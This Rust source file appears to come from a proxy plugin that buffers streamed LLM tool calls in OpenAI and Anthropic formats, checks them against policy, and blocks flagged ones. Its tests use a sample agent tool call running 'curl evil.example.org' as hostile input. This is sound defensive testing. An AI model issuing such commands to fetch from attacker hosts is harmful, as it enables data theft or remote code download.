//! Per-request response state: SSE tool-call fragments are held until the call is complete.

use std::collections::{BTreeMap, BTreeSet};
use std::sync::{Arc, Mutex};

use bytes::Bytes;
use serde_json::Value;

use crate::checks::check_call;
use crate::config::{Config, Mode, Severity};
use crate::journal::{Entry, Journal};
use crate::metrics::Metrics;
use crate::parse::{Call, Format, MAX_CALLS, RequestParse, notice};

const MAX_ARGS: usize = 64 * 1024;
const MAX_BUFFERED_BODY: usize = 8 * 1024 * 1024;

#[derive(Debug)]
struct HeldCall {
    name: String,
    arguments: String,
    raw: Vec<Vec<u8>>,
    /// Anthropic starts with an empty input object; deltas then carry the real JSON.
    delta_started: bool,
}

/// One request's response hooks. In `report` mode bytes pass through unchanged; in `block`
/// mode tool-call fragments stay held until the call can be judged and, if needed, replaced.
#[derive(Debug)]
pub struct Session {
    config: Arc<Config>,
    metrics: Metrics,
    journal: Arc<Mutex<Journal>>,
    active: bool,
    format: Option<Format>,
    stream: String,
    upstream: String,
    declared: BTreeSet<String>,
    provenance: String,
    sse: bool,
    line: Vec<u8>,
    raw_event: Vec<u8>,
    data: String,
    buffered: Vec<u8>,
    openai: BTreeMap<(usize, usize), HeldCall>,
    anthropic: BTreeMap<usize, HeldCall>,
    choice_blocked: BTreeMap<usize, bool>,
    unparsed: bool,
    unparsed_counted: bool,
    final_notice: Option<Vec<u8>>,
    done: bool,
}

impl Session {
    pub fn new(config: Arc<Config>, metrics: Metrics, journal: Arc<Mutex<Journal>>) -> Self {
        Self {
            config,
            metrics,
            journal,
            active: false,
            format: None,
            stream: String::new(),
            upstream: String::new(),
            declared: BTreeSet::new(),
            provenance: String::new(),
            sse: false,
            line: Vec::new(),
            raw_event: Vec::new(),
            data: String::new(),
            buffered: Vec::new(),
            openai: BTreeMap::new(),
            anthropic: BTreeMap::new(),
            choice_blocked: BTreeMap::new(),
            unparsed: false,
            unparsed_counted: false,
            final_notice: None,
            done: false,
        }
    }

    pub fn configure(
        &mut self,
        stream: &str,
        upstream: &str,
        selected: bool,
        parsed: RequestParse,
    ) {
        self.stream = stream.to_owned();
        self.upstream = upstream.to_owned();
        if !selected {
            return;
        }
        self.active = true;
        match parsed {
            RequestParse::Unrelated => self.active = false,
            RequestParse::Unparsed(format) => {
                self.format = Some(format);
                self.mark_unparsed();
            }
            RequestParse::Recognized {
                format,
                declared,
                provenance,
            } => {
                self.format = Some(format);
                self.declared = declared;
                self.provenance = provenance;
            }
        }
    }

    pub fn set_head(&mut self, upstream: &str, sse: bool, success: bool) {
        if !upstream.is_empty() {
            self.upstream = upstream.to_owned();
        }
        self.sse = sse;
        if sse && self.unparsed && self.config.mode == Mode::Block {
            self.set_unparsed_notice();
        }
        if !success {
            self.active = false;
        }
    }

    pub fn feed(&mut self, chunk: &mut Bytes, is_last: bool) {
        if !self.active || self.done {
            return;
        }
        let mut out = Vec::new();
        let incoming = std::mem::take(chunk).to_vec();
        if self.sse {
            self.feed_sse(&incoming, &mut out);
        } else {
            self.buffered.extend_from_slice(&incoming);
            if self.buffered.len() > MAX_BUFFERED_BODY {
                self.mark_unparsed();
            }
        }
        if is_last {
            if !self.sse {
                self.finish_buffered(&mut out);
            }
            self.finish(&mut out);
        }
        *chunk = Bytes::from(out);
    }

    fn feed_sse(&mut self, bytes: &[u8], out: &mut Vec<u8>) {
        for part in bytes.split_inclusive(|b| *b == b'\n') {
            self.line.extend_from_slice(part);
            self.raw_event.extend_from_slice(part);
            if !part.ends_with(b"\n") {
                continue;
            }
            let blank = self.line.iter().all(|b| matches!(b, b'\r' | b'\n'));
            if blank {
                let mut raw = std::mem::take(&mut self.raw_event);
                if !raw.is_empty() {
                    if !raw.ends_with(b"\n") {
                        raw.push(b'\n');
                    }
                    self.process_event(&raw, out);
                }
                self.line.clear();
                continue;
            }
            let text = String::from_utf8_lossy(&self.line);
            if let Some(data) = text.trim_end_matches(['\r', '\n']).strip_prefix("data:") {
                self.data.push_str(data.strip_prefix(' ').unwrap_or(data));
                self.data.push('\n');
            }
            self.line.clear();
        }
    }

    fn process_event(&mut self, raw: &[u8], out: &mut Vec<u8>) {
        let data = std::mem::take(&mut self.data);
        let text = data.trim();
        if text.is_empty() || text == "[DONE]" {
            self.emit(raw, out);
            return;
        }
        let Ok(value) = serde_json::from_str::<Value>(text) else {
            self.mark_unparsed();
            self.emit_if_allowed(raw, out);
            return;
        };
        match self.format {
            Some(Format::OpenAiChat) => self.openai_event(&value, raw, out),
            Some(Format::AnthropicMessages) => self.anthropic_event(&value, raw, out),
            None => {
                self.mark_unparsed();
                self.emit_if_allowed(raw, out);
            }
        }
    }

    fn openai_event(&mut self, value: &Value, raw: &[u8], out: &mut Vec<u8>) {
        let mut handled = false;
        if let Some(choices) = value.get("choices").and_then(Value::as_array) {
            for choice in choices {
                let choice_index =
                    choice.get("index").and_then(Value::as_u64).unwrap_or(0) as usize;
                if let Some(tool_calls) = choice
                    .get("delta")
                    .and_then(|d| d.get("tool_calls"))
                    .and_then(Value::as_array)
                {
                    for tool_call in tool_calls {
                        let tool_index =
                            tool_call.get("index").and_then(Value::as_u64).unwrap_or(0) as usize;
                        let key = (choice_index, tool_index);
                        let function = tool_call.get("function");
                        let name = function
                            .and_then(|f| f.get("name"))
                            .and_then(Value::as_str)
                            .unwrap_or("");
                        let arguments = function
                            .and_then(|f| f.get("arguments"))
                            .and_then(Value::as_str)
                            .unwrap_or("");
                        if !self.openai.contains_key(&key) {
                            if self.openai.len() + self.anthropic.len() >= MAX_CALLS {
                                self.mark_unparsed();
                            } else {
                                self.openai.insert(
                                    key,
                                    HeldCall {
                                        name: String::new(),
                                        arguments: String::new(),
                                        raw: Vec::new(),
                                        delta_started: false,
                                    },
                                );
                            }
                        }
                        handled = true;
                        let over = if let Some(call) = self.openai.get_mut(&key) {
                            call.name.push_str(name);
                            let over = append_capped(&mut call.arguments, arguments);
                            call.raw.push(raw.to_vec());
                            over
                        } else {
                            false
                        };
                        if over {
                            self.mark_unparsed();
                        }
                    }
                }
                if choice.get("finish_reason").and_then(Value::as_str) == Some("tool_calls") {
                    let has_calls = self
                        .openai
                        .keys()
                        .any(|(choice, _)| *choice == choice_index);
                    if !has_calls {
                        self.mark_unparsed();
                    }
                    self.finish_openai_choice(choice_index, out);
                    let blocked = self
                        .choice_blocked
                        .get(&choice_index)
                        .copied()
                        .unwrap_or(false);
                    if blocked && self.config.mode == Mode::Block {
                        out.extend_from_slice(&openai_stop_event(choice_index));
                    } else {
                        out.extend_from_slice(&openai_finish_event(choice_index, "tool_calls"));
                    }
                    handled = true;
                }
            }
        }
        if !handled {
            self.emit(raw, out);
        }
    }

    fn anthropic_event(&mut self, value: &Value, raw: &[u8], out: &mut Vec<u8>) {
        let Some(event_type) = value.get("type").and_then(Value::as_str) else {
            self.mark_unparsed();
            self.emit_if_allowed(raw, out);
            return;
        };
        match event_type {
            "content_block_start" => {
                let block = value.get("content_block");
                if block.and_then(|b| b.get("type")).and_then(Value::as_str) != Some("tool_use") {
                    self.emit(raw, out);
                    return;
                }
                let Some(index) = value.get("index").and_then(Value::as_u64) else {
                    self.mark_unparsed();
                    self.emit_if_allowed(raw, out);
                    return;
                };
                let name = block
                    .and_then(|b| b.get("name"))
                    .and_then(Value::as_str)
                    .unwrap_or("");
                let arguments = match block.and_then(|b| b.get("input")) {
                    Some(Value::Object(fields)) if fields.is_empty() => String::new(),
                    Some(value) => json_arguments(value),
                    None => "{}".to_owned(),
                };
                let index = index as usize;
                if self.openai.len() + self.anthropic.len() >= MAX_CALLS {
                    self.mark_unparsed();
                } else {
                    self.anthropic.insert(
                        index,
                        HeldCall {
                            name: name.to_owned(),
                            arguments,
                            raw: vec![raw.to_vec()],
                            delta_started: false,
                        },
                    );
                }
            }
            "content_block_delta" => {
                let delta_type = value
                    .get("delta")
                    .and_then(|d| d.get("type"))
                    .and_then(Value::as_str);
                if delta_type != Some("input_json_delta") {
                    self.emit(raw, out);
                    return;
                }
                let Some(index) = value.get("index").and_then(Value::as_u64) else {
                    self.mark_unparsed();
                    self.emit_if_allowed(raw, out);
                    return;
                };
                let part = value
                    .get("delta")
                    .and_then(|d| d.get("partial_json"))
                    .and_then(Value::as_str)
                    .unwrap_or("");
                let index = index as usize;
                let over = if let Some(call) = self.anthropic.get_mut(&index) {
                    if !call.delta_started {
                        call.arguments.clear();
                        call.delta_started = true;
                    }
                    let over = append_capped(&mut call.arguments, part);
                    call.raw.push(raw.to_vec());
                    over
                } else {
                    self.mark_unparsed();
                    self.emit_if_allowed(raw, out);
                    false
                };
                if over {
                    self.mark_unparsed();
                }
            }
            "content_block_stop" => {
                let Some(index) = value.get("index").and_then(Value::as_u64) else {
                    self.emit(raw, out);
                    return;
                };
                let index = index as usize;
                if self.anthropic.contains_key(&index) {
                    if let Some(call) = self.anthropic.get_mut(&index) {
                        call.raw.push(raw.to_vec());
                    }
                    self.finish_anthropic(index, out);
                } else {
                    self.emit(raw, out);
                }
            }
            _ => self.emit(raw, out),
        }
    }

    fn finish_buffered(&mut self, out: &mut Vec<u8>) {
        let body = std::mem::take(&mut self.buffered);
        if self.unparsed {
            if self.config.mode == Mode::Block {
                out.extend_from_slice(
                    b"[toolpolicy] response could not be parsed; tool calls blocked\n",
                );
            } else {
                out.extend_from_slice(&body);
            }
            return;
        }
        let Some(format) = self.format else {
            out.extend_from_slice(&body);
            return;
        };
        let extracted = crate::parse::extract_calls(format, &body);
        if extracted.unparsed {
            self.mark_unparsed();
            if self.config.mode == Mode::Block {
                out.extend_from_slice(
                    b"[toolpolicy] response could not be parsed; tool calls blocked\n",
                );
            } else {
                out.extend_from_slice(&body);
            }
            return;
        }
        if extracted.calls.is_empty() {
            out.extend_from_slice(&body);
            return;
        }
        let blocked = extracted
            .calls
            .iter()
            .enumerate()
            .filter_map(|(index, call)| self.evaluate(call).then_some(index))
            .collect::<BTreeSet<_>>();
        if blocked.is_empty() || self.config.mode != Mode::Block {
            out.extend_from_slice(&body);
            return;
        }
        match crate::parse::apply_blocks(format, &body, &blocked) {
            Some(rewritten) => out.extend_from_slice(&rewritten),
            None => self.mark_unparsed(),
        }
    }

    fn finish_openai_choice(&mut self, choice: usize, out: &mut Vec<u8>) {
        let keys: Vec<(usize, usize)> = self
            .openai
            .keys()
            .filter(|(c, _)| *c == choice)
            .copied()
            .collect();
        for key in keys {
            let Some(mut call) = self.openai.remove(&key) else {
                continue;
            };
            if call.arguments.is_empty() {
                call.arguments.push_str("{}");
            }
            if !valid_arguments(&call.arguments) {
                self.mark_unparsed();
                self.release(&call.raw, out);
                continue;
            }
            let name = call.name.clone();
            let blocked = self.evaluate(&Call {
                name: name.clone(),
                arguments: call.arguments,
            });
            if blocked && self.config.mode == Mode::Block {
                self.choice_blocked.insert(choice, true);
                out.extend_from_slice(&openai_notice_event(choice, &name));
            } else {
                for raw in &call.raw {
                    out.extend_from_slice(raw);
                }
            }
        }
    }

    fn finish_anthropic(&mut self, index: usize, out: &mut Vec<u8>) {
        let Some(mut call) = self.anthropic.remove(&index) else {
            return;
        };
        if call.arguments.is_empty() {
            call.arguments.push_str("{}");
        }
        if !valid_arguments(&call.arguments) {
            self.mark_unparsed();
            self.release(&call.raw, out);
            return;
        }
        let name = call.name.clone();
        let blocked = self.evaluate(&Call {
            name: name.clone(),
            arguments: call.arguments,
        });
        if blocked && self.config.mode == Mode::Block {
            out.extend_from_slice(&anthropic_notice_events(index, &name));
        } else {
            for raw in &call.raw {
                out.extend_from_slice(raw);
            }
        }
    }

    fn finish(&mut self, out: &mut Vec<u8>) {
        if !self.raw_event.is_empty() {
            let mut raw = std::mem::take(&mut self.raw_event);
            raw.push(b'\n');
            self.process_event(&raw, out);
        }
        let choices: BTreeSet<usize> = self.openai.keys().map(|(choice, _)| *choice).collect();
        for choice in choices {
            self.finish_openai_choice(choice, out);
        }
        let indices: Vec<usize> = self.anthropic.keys().copied().collect();
        for index in indices {
            self.finish_anthropic(index, out);
        }
        if let Some(notice) = self.final_notice.take() {
            out.extend_from_slice(&notice);
        }
        self.done = true;
    }

    fn evaluate(&self, call: &Call) -> bool {
        let findings = check_call(
            &call.name,
            &call.arguments,
            &self.declared,
            &self.provenance,
            &self.config,
        );
        if findings.is_empty() {
            self.metrics
                .record_call(&self.stream, &self.upstream, "passed");
            return false;
        }
        for finding in &findings {
            self.metrics.record_finding(finding.rule, finding.severity);
        }
        let blocks = self.config.mode == Mode::Block
            && findings
                .iter()
                .any(|f| f.severity >= self.config.block_severity);
        let action = if blocks { "blocked" } else { "reported" };
        self.metrics
            .record_call(&self.stream, &self.upstream, action);
        let severity = findings
            .iter()
            .map(|f| f.severity)
            .max()
            .unwrap_or(Severity::Medium);
        let rules: Vec<&'static str> = findings.iter().map(|f| f.rule).collect();
        if let Ok(mut journal) = self.journal.lock() {
            journal.write(&Entry {
                stream: &self.stream,
                upstream: &self.upstream,
                tool: &call.name,
                rules: &rules,
                severity: severity.label(),
                action,
                arguments: &call.arguments,
            });
        }
        blocks
    }

    fn mark_unparsed(&mut self) {
        self.unparsed = true;
        if !self.unparsed_counted {
            self.metrics.record_unparsed(&self.stream, &self.upstream);
            self.unparsed_counted = true;
        }
        if self.config.mode == Mode::Block && self.sse {
            self.set_unparsed_notice();
        }
    }

    fn set_unparsed_notice(&mut self) {
        if self.final_notice.is_some() {
            return;
        }
        self.final_notice = Some(match self.format {
            Some(Format::AnthropicMessages) => anthropic_text_events(
                0,
                "[toolpolicy] response could not be parsed; tool calls blocked",
            ),
            _ => openai_text_event(
                0,
                "[toolpolicy] response could not be parsed; tool calls blocked",
            ),
        });
    }

    fn emit(&self, raw: &[u8], out: &mut Vec<u8>) {
        out.extend_from_slice(raw);
    }

    fn emit_if_allowed(&self, raw: &[u8], out: &mut Vec<u8>) {
        if self.config.mode != Mode::Block || !self.unparsed {
            out.extend_from_slice(raw);
        }
    }

    fn release(&self, held: &[Vec<u8>], out: &mut Vec<u8>) {
        if self.config.mode == Mode::Block && self.unparsed {
            return;
        }
        for raw in held {
            out.extend_from_slice(raw);
        }
    }
}

fn append_capped(target: &mut String, text: &str) -> bool {
    if target.len() + text.len() > MAX_ARGS {
        let room = MAX_ARGS.saturating_sub(target.len());
        target.push_str(&text[..room.min(text.len())]);
        return true;
    }
    target.push_str(text);
    false
}

fn valid_arguments(text: &str) -> bool {
    serde_json::from_str::<Value>(text).is_ok()
}

fn json_arguments(value: &Value) -> String {
    match value {
        Value::String(text) => text.clone(),
        _ => serde_json::to_string(value).unwrap_or_else(|_| "{}".to_owned()),
    }
}

fn openai_data(payload: Value) -> Vec<u8> {
    format!("data: {payload}\n\n").into_bytes()
}

fn openai_text_event(index: usize, text: &str) -> Vec<u8> {
    openai_data(serde_json::json!({
        "choices": [{"index": index, "delta": {"content": text}, "finish_reason": null}]
    }))
}

fn openai_notice_event(index: usize, name: &str) -> Vec<u8> {
    openai_text_event(index, &notice(&[name.to_owned()]))
}

fn openai_finish_event(index: usize, reason: &str) -> Vec<u8> {
    openai_data(serde_json::json!({
        "choices": [{"index": index, "delta": {}, "finish_reason": reason}]
    }))
}

fn openai_stop_event(index: usize) -> Vec<u8> {
    openai_finish_event(index, "stop")
}

fn anthropic_event_data(payload: Value, name: &str) -> Vec<u8> {
    format!("event: {name}\ndata: {payload}\n\n").into_bytes()
}

fn anthropic_text_events(index: usize, text: &str) -> Vec<u8> {
    let mut out = anthropic_event_data(
        serde_json::json!({
            "type": "content_block_start",
            "index": index,
            "content_block": {"type": "text", "text": ""}
        }),
        "content_block_start",
    );
    out.extend_from_slice(&anthropic_event_data(
        serde_json::json!({
            "type": "content_block_delta",
            "index": index,
            "delta": {"type": "text_delta", "text": text}
        }),
        "content_block_delta",
    ));
    out.extend_from_slice(&anthropic_event_data(
        serde_json::json!({"type": "content_block_stop", "index": index}),
        "content_block_stop",
    ));
    out
}

fn anthropic_notice_events(index: usize, name: &str) -> Vec<u8> {
    anthropic_text_events(index, &notice(&[name.to_owned()]))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::parse;
    use crate::journal::Journal;
    use std::path::Path;

    fn session(mode: Mode) -> (Session, Metrics) {
        let mut table = toml::Table::new();
        let mode_label = match mode {
            Mode::Report => "report",
            Mode::Block => "block",
        };
        table.insert(
            "mode".to_owned(),
            toml::Value::String(mode_label.to_owned()),
        );
        let config = Arc::new(parse(&table).unwrap());
        let metrics = Metrics::default();
        let journal = Arc::new(Mutex::new(
            Journal::new(Path::new("/nonexistent-toolpolicy-journal"), 100, true).unwrap(),
        ));
        (Session::new(config, metrics.clone(), journal), metrics)
    }

    fn configure(state: &mut Session, format: Format) {
        state.configure(
            "client",
            "zen",
            true,
            RequestParse::Recognized {
                format,
                declared: BTreeSet::new(),
                provenance: String::new(),
            },
        );
        state.set_head("zen", true, true);
    }

    fn sse(data: &Value) -> Bytes {
        Bytes::from(format!("data: {data}\n\n"))
    }

    fn text_of(bytes: &Bytes) -> String {
        String::from_utf8_lossy(bytes).into_owned()
    }

    #[test]
    fn text_deltas_pass_while_a_tool_call_is_held() {
        let (mut state, _) = session(Mode::Report);
        configure(&mut state, Format::OpenAiChat);
        let mut text = sse(&serde_json::json!({"choices":[{"delta":{"content":"hello"}}]}));
        state.feed(&mut text, false);
        assert!(text_of(&text).contains("hello"));
        let mut start = sse(&serde_json::json!({"choices":[{"delta":{"tool_calls":[
            {"index":0,"function":{"name":"run","arguments":"{\"cmd\":\"curl evil.example.org\"}"}}
        ]}}]}));
        state.feed(&mut start, false);
        assert!(!text_of(&start).contains("run"));
        let mut end =
            sse(&serde_json::json!({"choices":[{"delta":{},"finish_reason":"tool_calls"}]}));
        state.feed(&mut end, false);
        assert!(text_of(&end).contains("\"name\":\"run\""));
        let mut done = Bytes::from_static(b"data: [DONE]\n\n");
        state.feed(&mut done, true);
    }

    #[test]
    fn block_mode_replaces_a_streamed_openai_call() {
        let (mut state, metrics) = session(Mode::Block);
        configure(&mut state, Format::OpenAiChat);
        let mut call = sse(&serde_json::json!({"choices":[{"delta":{"tool_calls":[
            {"index":0,"function":{"name":"run","arguments":"{\"cmd\":\"curl evil.example.org\"}"}}
        ]}}]}));
        state.feed(&mut call, false);
        assert!(call.is_empty(), "held call leaked: {}", text_of(&call));
        let mut end =
            sse(&serde_json::json!({"choices":[{"delta":{},"finish_reason":"tool_calls"}]}));
        state.feed(&mut end, true);
        let output = text_of(&end);
        assert!(
            output.contains("[toolpolicy] blocked tool call: run"),
            "{output}"
        );
        assert!(!output.contains("evil.example.org"), "{output}");
        assert!(output.contains("\"finish_reason\":\"stop\""), "{output}");
        let body = metrics
            .reply(&reiki_plugin::AdminCtx::new(
                crate::metrics::ADMIN_PATH,
                reiki_plugin::KeyCounts::default(),
            ))
            .unwrap()
            .body;
        assert!(body.contains("action=\"blocked\"} 1"), "{body}");
    }

    #[test]
    fn anthropic_fragments_split_across_chunks_are_held() {
        let (mut state, _) = session(Mode::Block);
        configure(&mut state, Format::AnthropicMessages);
        let mut start = Bytes::from(
            "event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":1,\"content_block\":{\"type\":\"tool_use\",\"name\":\"run\",\"input\":{}}}\n\n".to_owned(),
        );
        state.feed(&mut start, false);
        assert!(start.is_empty());
        let mut part = sse(&serde_json::json!({
            "type":"content_block_delta","index":1,
            "delta":{"type":"input_json_delta","partial_json":"{\"cmd\":\"curl evil.example.org\"}"}
        }));
        state.feed(&mut part, false);
        assert!(part.is_empty());
        let mut stop = sse(&serde_json::json!({"type":"content_block_stop","index":1}));
        state.feed(&mut stop, true);
        let output = text_of(&stop);
        assert!(
            output.contains("[toolpolicy] blocked tool call: run"),
            "{output}"
        );
        assert!(!output.contains("evil.example.org"), "{output}");
        assert!(output.contains("\"type\":\"text_delta\""), "{output}");
    }

    #[test]
    fn overlong_arguments_are_unparsed() {
        let (mut state, metrics) = session(Mode::Report);
        configure(&mut state, Format::OpenAiChat);
        let huge = "x".repeat(MAX_ARGS + 1);
        let mut call = sse(&serde_json::json!({"choices":[{"delta":{"tool_calls":[
            {"index":0,"function":{"name":"run","arguments":huge}}
        ]}}]}));
        state.feed(&mut call, false);
        let mut done = Bytes::new();
        state.feed(&mut done, true);
        let body = metrics
            .reply(&reiki_plugin::AdminCtx::new(
                crate::metrics::ADMIN_PATH,
                reiki_plugin::KeyCounts::default(),
            ))
            .unwrap()
            .body;
        assert!(body.contains("reiki_toolpolicy_unparsed_total"), "{body}");
    }

    #[test]
    fn an_openai_event_split_mid_line_is_held_until_the_call_is_complete() {
        let (mut state, _) = session(Mode::Block);
        configure(&mut state, Format::OpenAiChat);
        let full = serde_json::json!({"choices":[{"delta":{"tool_calls":[
            {"index":0,"function":{"name":"run","arguments":"{\"cmd\":\"curl evil.example.org\"}"}}
        ]}}]})
        .to_string();
        let split = 80;
        let mut first = Bytes::from(format!("data: {}", &full[..split]));
        state.feed(&mut first, false);
        assert!(
            first.is_empty(),
            "partial event leaked: {}",
            text_of(&first)
        );
        let mut second = Bytes::from(format!("{}\n\n", &full[split..]));
        state.feed(&mut second, false);
        assert!(second.is_empty(), "held call leaked: {}", text_of(&second));
        let mut end =
            sse(&serde_json::json!({"choices":[{"delta":{},"finish_reason":"tool_calls"}]}));
        state.feed(&mut end, true);
        let output = text_of(&end);
        assert!(
            output.contains("[toolpolicy] blocked tool call: run"),
            "{output}"
        );
        assert!(!output.contains("evil.example.org"), "{output}");
    }

    #[test]
    fn block_mode_drops_held_calls_when_a_stream_cannot_be_parsed() {
        let (mut state, _) = session(Mode::Block);
        configure(&mut state, Format::OpenAiChat);
        let mut call = sse(&serde_json::json!({"choices":[{"delta":{"tool_calls":[
            {"index":0,"function":{"name":"run","arguments":"{\"cmd\":\"curl evil.example.org\"}"}}
        ]}}]}));
        state.feed(&mut call, false);
        assert!(call.is_empty());
        let mut broken = Bytes::from_static(b"data: {oops\n\n");
        state.feed(&mut broken, false);
        assert!(
            broken.is_empty(),
            "unparsed event leaked: {}",
            text_of(&broken)
        );
        let mut done = Bytes::new();
        state.feed(&mut done, true);
        let output = text_of(&done);
        assert!(output.contains("could not be parsed"), "{output}");
        assert!(!output.contains("evil.example.org"), "{output}");
    }

    #[test]
    fn a_buffered_body_is_checked_in_one_piece() {
        let (mut state, _) = session(Mode::Block);
        configure(&mut state, Format::OpenAiChat);
        state.set_head("zen", false, true);
        let mut body = Bytes::from(
            r#"{"choices":[{"message":{"tool_calls":[{"function":{"name":"run","arguments":"{\"cmd\":\"curl evil.example.org\"}"}}]}}]}"#.to_owned(),
        );
        state.feed(&mut body, true);
        let output = text_of(&body);
        assert!(
            output.contains("[toolpolicy] blocked tool call: run"),
            "{output}"
        );
        assert!(!output.contains("evil.example.org"), "{output}");
    }
}
